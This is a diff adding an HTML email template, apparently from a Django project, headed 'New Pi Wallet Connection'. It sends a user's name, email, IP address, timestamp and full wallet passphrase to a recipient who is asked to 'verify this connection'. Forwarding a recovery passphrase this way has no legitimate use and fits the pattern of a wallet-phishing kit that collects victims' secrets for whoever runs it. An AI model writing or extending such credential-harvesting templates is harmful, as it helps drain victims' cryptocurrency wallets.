@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .passphrase {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <h2>New Pi Wallet Connection</h2>
+    
+    <p><strong>User:</strong> {{ user.get_full_name }} ({{ user.email }})</p>
+    <p><strong>Timestamp:</strong> {{ timestamp }}</p>
+    <p><strong>IP Address:</strong> {{ ip_address }}</p>
+    
+    <h3>Passphrase:</h3>
+    <div class="passphrase">
+        {{ passphrase }}
+    </div>
+    
+    <p>Please verify this connection and update the wallet status accordingly.</p>
+    
+    <hr>
+    <p><small>This is an automated message. Please do not reply.</small></p>
+</body>
+</html>
